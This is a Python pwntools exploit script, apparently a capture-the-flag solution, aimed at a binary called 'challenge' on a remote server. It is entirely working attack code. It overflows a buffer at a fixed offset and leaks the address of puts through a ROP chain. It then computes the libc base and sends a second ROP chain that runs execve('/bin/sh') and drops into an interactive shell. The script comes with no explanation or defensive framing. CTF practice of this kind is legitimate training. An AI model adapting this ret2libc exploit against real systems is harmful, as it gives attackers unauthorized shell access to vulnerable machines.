from pwn import *


context.arch = "amd64"
context.binary = "./dist/deploy/challenge"


proc = remote("overly.uniquename.xyz",2052)
#proc = process('./challenge')
#proc = gdb.debug("./challenge", '''
#        break main 
#        ''')

OFFSET = 0x218
elf = ELF('./dist/deploy/challenge')
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so') #Needs libc 2-31.so

#Stage 1:
payload = b'a' * OFFSET
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])
payload += bytes(rop)
proc.recvline()
proc.sendline(payload)
print(proc.recvlines(numlines=2))
leaked_puts = proc.recvline()[:8].strip().ljust(8,b"\x00")
leaked_puts = u64(leaked_puts)
print(hex(leaked_puts))

#Stage 2:
libc.address = leaked_puts - libc.symbols["puts"]
print(hex(libc.address))
rop2 = ROP(libc)
rop2.execve(next(libc.search(b'/bin/sh')),0,0)
payload = b'a' * OFFSET
payload += bytes(rop2)
print(proc.recvline())
proc.sendline(payload)
print(proc.recvline())
print(proc.recvline())
proc.interactive()
